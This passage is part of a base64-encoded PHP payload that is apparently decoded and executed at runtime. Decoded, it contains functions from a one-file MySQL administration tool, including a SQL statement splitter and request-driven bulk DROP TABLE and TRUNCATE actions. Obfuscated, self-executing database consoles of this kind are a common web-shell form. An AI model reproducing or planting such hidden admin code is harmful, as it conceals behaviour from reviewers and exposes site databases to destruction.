kc3RyLCAkY3VyX3Bvcyk7DQogICAgICAgICAgaWYgKCRvY2hhcj09JzsnKXsNCiAgICAgICAgICAgICAkc3FsLj1zdWJzdHIoJHN0ciwgJGN1cl9wb3MsICRvcG9zLSRjdXJfcG9zKzEpOw0KICAgICAgICAgICAgIGlmICghZG9fb25lX3NxbCgkc3FsKSkgcmV0dXJuIDA7DQogICAgICAgICAgICAgJHNxbD0nJzsNCiAgICAgICAgICAgICAkY3VyX3Bvcz0kb3BvcytzdHJsZW4oJG9jaGFyKTsNCiAgICAgICAgICAgICAkb2NoYXI9Jyc7DQogICAgICAgICAgICAgJG9wb3M9MDsNCiAgICAgICAgICB9ZWxzZWlmKCEkb2NoYXIpIHsNCiAgICAgICAgICAgICAkc3FsLj1zdWJzdHIoJHN0ciwgJGN1cl9wb3MpOw0KICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICRpc19jbXQ9MDtpZiAoJG9jaGFyPT0nLyonICYmIHN1YnN0cigkc3RyLCAkb3BvcywgMykhPScvKiEnKSAkaXNfY210PTE7DQogICAgICAgICAgfQ0KICAgICAgIH0NCiAgICB9DQogfQ0KDQogaWYgKCRzcWwpew0KICAgIGlmICghZG9fb25lX3NxbCgkc3FsKSkgcmV0dXJuIDA7DQogICAgJHNxbD0nJzsNCiB9DQogcmV0dXJuIDE7DQp9DQoNCi8vcmVhZCBmcm9tIGluc3FsIHZhciBvciBmaWxlDQpmdW5jdGlvbiBnZXRfbmV4dF9jaHVuaygkaW5zcWwsICRmbmFtZSl7DQogZ2xvYmFsICRMRklMRSwgJGluc3FsX2RvbmU7DQogaWYgKCRpbnNxbCkgew0KICAgIGlmICgkaW5zcWxfZG9uZSl7DQogICAgICAgcmV0dXJuICcnOw0KICAgIH1lbHNlew0KICAgICAgICRpbnNxbF9kb25lPTE7DQogICAgICAgcmV0dXJuICRpbnNxbDsNCiAgICB9DQogfQ0KIGlmICghJGZuYW1lKSByZXR1cm4gJyc7DQogaWYgKCEkTEZJTEUpew0KICAgICRMRklMRT1mb3BlbigkZm5hbWUsInIrYiIpIG9yIGRpZSgiQ2FuJ3Qgb3BlbiBbJGZuYW1lXSBmaWxlICQhIik7DQogfQ0KIHJldHVybiBmcmVhZCgkTEZJTEUsIDY0KjEwMjQpOw0KfQ0KDQpmdW5jdGlvbiBnZXRfb3Blbl9jaGFyKCRzdHIsICRwb3Mpew0KIGlmICggcHJlZ19tYXRjaCgiLyhcL1wqfF4tLXwoPzw9XHMpLS18I3wnfFwifDspLyIsICRzdHIsICRtLCBQUkVHX09GRlNFVF9DQVBUVVJFLCAkcG9zKSApIHsNCiAgICAkb2NoYXI9JG1bMV1bMF07DQogICAgJG9wb3M9JG1bMV1bMV07DQogfQ0KIHJldHVybiBhcnJheSgkb2NoYXIsICRvcG9zKTsNCn0NCg0KI1JFQ1VSU0lWRSENCmZ1bmN0aW9uIGdldF9jbG9zZV9jaGFyKCRzdHIsICRwb3MsICRvY2hhcil7DQogJGFDTE9TRT1hcnJheSgNCiAgICdcJycgPT4gJyg/PCFcXFxcKVwnfChcXFxcKylcJycsDQogICAnIicgPT4gJyg/PCFcXFxcKSInLA0KICAgJy8qJyA9PiAnXCpcLycsDQogICAnIycgPT4gJ1tcclxuXSsnLA0KICAgJy0tJyA9PiAnW1xyXG5dKycsDQogKTsNCiBpZiAoICRhQ0xPU0VbJG9jaGFyXSAmJiBwcmVnX21hdGNoKCIvKCIuJGFDTE9TRVskb2NoYXJdLiIpLyIsICRzdHIsICRtLCBQUkVHX09GRlNFVF9DQVBUVVJFLCAkcG9zICkgKSB7DQogICAgJGNsY2hhcj0kbVsxXVswXTsNCiAgICAkY2xwb3M9JG1bMV1bMV07DQogICAgJHNsPXN0cmxlbigkbVsyXVswXSk7DQogICAgaWYgKCRvY2hhcj09IiciICYmICRzbCl7DQogICAgICAgaWYgKCRzbCAlIDIpeyAjZG9uJ3QgY291bnQgYXMgQ0xPU0UgY2hhciBpZiBudW1iZXIgb2Ygc2xhc2hlcyBiZWZvcmUgJyBPREQNCiAgICAgICAgICBsaXN0KCRjbGNoYXIsICRjbHBvcyk9Z2V0X2Nsb3NlX2NoYXIoJHN0ciwgJGNscG9zK3N0cmxlbigkY2xjaGFyKSwgJG9jaGFyKTsNCiAgICAgICB9ZWxzZXsNCiAgICAgICAgICAkY2xwb3MrPXN0cmxlbigkY2xjaGFyKS0xOyRjbGNoYXI9IiciOyNjb3JyZWN0aW9uDQogICAgICAgfQ0KICAgIH0NCiB9DQogcmV0dXJuIGFycmF5KCRjbGNoYXIsICRjbHBvcyk7DQp9DQoNCmZ1bmN0aW9uIGRvX29uZV9zcWwoJHNxbCl7DQogZ2xvYmFsICRsYXN0X3N0aCwkbGFzdF9zcWwsJE1BWF9ST1dTX1BFUl9QQUdFLCRwYWdlLCRpc19saW1pdGVkX3NxbCwkbGFzdF9jb3VudCwkSVNfQ09VTlQ7DQogJHNxbD10cmltKCRzcWwpOw0KICRzcWw9cHJlZ19yZXBsYWNlKCIvOyQvIiwiIiwkc3FsKTsNCiBpZiAoJHNxbCl7DQogICAgJGxhc3Rfc3FsPSRzcWw7JGlzX2xpbWl0ZWRfc3FsPTA7DQogICAgJGxhc3RfY291bnQ9TlVMTDsNCiAgICBpZiAocHJlZ19tYXRjaCgiL15zZWxlY3QvaSIsJHNxbCkgJiYgIXByZWdfbWF0Y2goIi9saW1pdCArXGQrL2kiLCAkc3FsKSl7DQogICAgICAgaWYgKCRJU19DT1VOVCl7DQogICAgICAgICAgI2dldCB0b3RhbCBjb3VudA0KICAgICAgICAgICRzcWwxPSdzZWxlY3QgY291bnQoKikgZnJvbSAoJy4kc3FsLicpIF9fX2NvdW50X3RhYmxlJzsNCiAgICAgICAgICAkbGFzdF9jb3VudD1kYl92YWx1ZSgkc3FsMSxOVUxMLCdub2VycicpOw0KICAgICAgIH0NCiAgICAgICAkb2Zmc2V0PSRwYWdlKiRNQVhfUk9XU19QRVJfUEFHRTsNCiAgICAgICAkc3FsLj0iIExJTUlUICRvZmZzZXQsJE1BWF9ST1dTX1BFUl9QQUdFIjsNCiAgICAgICAkaXNfbGltaXRlZF9zcWw9MTsNCiAgICB9DQogICAgJGxhc3Rfc3RoPWRiX3F1ZXJ5KCRzcWwsMCwnbm9lcnInKTsNCiAgICByZXR1cm4gJGxhc3Rfc3RoOw0KIH0NCiByZXR1cm4gMTsNCn0NCg0KZnVuY3Rpb24gZG9fc2h0KCl7DQogZ2xvYmFsICRTSE9XX1Q7DQogJGNiPSRfUkVRVUVTVFsnY2InXTsNCiBpZiAoIWlzX2FycmF5KCRjYikpICRjYj1hcnJheSgpOw0KICRzcWw9Jyc7DQogc3dpdGNoICgkX1JFUVVFU1RbJ2Rvc2h0J10pew0KICBjYXNlICdleHAnOiRfUkVRVUVTVFsndCddPWpvaW4oIiwiLCRjYik7cHJpbnRfZXhwb3J0KCk7ZXhpdDsNCiAgY2FzZSAnZHJvcCc6JHNxPSdEUk9QIFRBQkxFJzticmVhazsNCiAgY2FzZSAndHJ1bmMnOiRzcT0nVFJVTkNBVEUgVEFCTEUnO2JyZWFrOw0KICBjYXNlICdvcHQnOiRzcT0nT1BUSU1JWkUgVEFCTEUnO2JyZWFrOw0KIH0NCiBpZiAoJHNxKXsNCiAgZm9yZWFjaCgkY2IgYXMgJHYpew0KICAgJHNxbC49JHNxLiIgJHY7XG4iOw0KICB9DQogfQ0KIGlmICgkc3FsKSBkb19zcWwoJHNxbCk7DQogZG9fc3FsKCRTSE9XX1QpOw0KfQ0KDQpmdW5jdGlvbiB0b19jc3Zfcm93KCRhZGF0YSl7DQogZ2xvYmFsICREOw0KICRyPScnOw0KIGZvcmVhY2ggKCRhZGF0YSBhcyAkYSl7DQogICAkci49KCgkcik/IiwiOiIiKS5xc3RyKCRhKTsNCiB9DQogcmV0dXJuICRyLiREOw0KfQ0KZnVuY3Rpb24gcXN0cigkcyl7DQogJHM9bmwyYnIoJHMpOw0KICRzPXN0cl9yZXBsYWNlKCciJywnIiInLCRzKTsNCiByZXR1cm4gJyInLiRzLiciJzsNCn0NCg0KZnVuY3Rpb24gZ2V0X3JhbmRfc3RyKCRsZW4pew0KICRyZXN1bHQ9Jyc7DQogJGNoYXJzPXByZWdfc3BsaXQoJy8vJywnQUJDREVGYWJjZGVmMDEyMzQ1Njc4OScpOw0KIGZvcigkaT0wOyRpPCRsZW47JGkrKykgJHJlc3VsdC49JGNoYXJzW3JhbmQoMCxjb3VudCgkY2hhcnMpLTEpXTsNCiByZXR1cm4gJHJlc3VsdDsNCn0NCg0KZnVuY3Rpb24gY2hlY2tfeHNzKCl7DQogZ2xvYmFsICRzZWxmOw0KIGlmICgkX1NFU1NJT05bJ1hTUyddIT10cmltKCRfUkVRVUVTVFsnWFNTJ10pKXsNCiAgICB1bnNldCgkX1NFU1NJT05bJ1hTUyddKTsNCiAgICBoZWFkZXIoImxvY2F0aW9uOiAkc2VsZiIpOw0KICAgIGV4aXQ7DQogfQ0KfQ0KDQpmdW5jdGlvbiBydygkcyl7I2ZvciBkZWJ1Zw0KIGVjaG8gaHModmFyX2R1bXAoJHMpKS4iPGJyPlxuIjsNCn0NCg0KZnVuY3Rpb24gdG1wX25hbWUoKSB7DQogIGlmICggZnVuY3Rpb25fZXhpc3RzKCdzeXNfZ2V0X3RlbXBfZGlyJykpIHJldHVybiB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwncG1hJyk7DQoNCiAgaWYoICEoJHRlbXA9Z2V0ZW52KCdUTVAnKSkgKQ0KICAgIGlmKCAhKCR0ZW1wPWdldGVudignVEVNUCcpKSApDQogICAgICBpZiggISgkdGVtcD1nZXRlbnYoJ1RNUERJUicpKSApIHsNCiAgICAgICAgJHRlbXA9dGVtcG5hbShfX0ZJTEVfXywnJyk7DQogICAgICAgIGlmIChmaWxlX2V4aXN0cygkdGVtcCkpIHsNCiAgICAgICAgICB1bmxpbmsoJHRlbXApOw0KICAgICAgICAgICR0ZW1wPWRpcm5hbWUoJHRlbXApOw0KICAgICAgICB9DQogICAgICB9DQogIHJldHVybiAkdGVtcCA/IHRlbXBuYW0oJHRlbXAsJ3BtYScpIDogbnVsbDsNCn0NCg0KZnVuY3Rpb24gaHMoJHMpew0KICByZXR1cm4gaHRtbHNwZWNpYWxjaGFycygkcywgRU5UX0NPTVBBVHxFTlRfSFRNTDQwMSwnVVRGLTgnKTsNCn0NCmZ1bmN0aW9uIGVvKCRzKXsvL2VjaG8rZXNjYXBlDQogIGVjaG8gaHMoJHMpOw0KfQ0KZnVuY3Rpb24gdWUoJHMpew0KICByZXR1cm4gdXJsZW5jb2RlKCRzKTsNCn0NCg0KZnVuY3Rpb24gYjY0ZSgkcyl7DQogIHJldHVybiBiYXNlNjRfZW5jb2RlKCRzKTsNCn0NCmZ1bmN0aW9uIGI2NHUoJHMpew0KICByZXR1cm4gdWUoYmFzZTY0X2VuY29kZSgkcykpOw0KfQ0KZnVuY3Rpb24gYjY0ZCgkcyl7DQogIHJldHVybiBiYXNlNjRfZGVjb2RlKCRzKTsNCn0NCg0K"));
?>
